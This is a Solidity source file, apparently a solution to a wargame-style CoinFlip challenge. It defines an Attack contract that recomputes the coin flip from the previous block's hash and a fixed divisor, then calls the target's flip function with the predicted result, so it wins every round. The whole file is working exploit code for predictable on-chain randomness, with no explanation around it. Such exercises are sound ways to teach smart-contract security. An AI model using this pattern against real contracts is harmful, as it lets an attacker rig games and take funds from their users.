// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract Attack {
    CoinFlip private immutable i_coinFlip;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        i_coinFlip = CoinFlip(_coinFlip);
    }

    function attackCoinFlip() external {
        bool guess = _guessFlipCoinOutcome();
        i_coinFlip.flip(guess);
    }

    function _guessFlipCoinOutcome() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
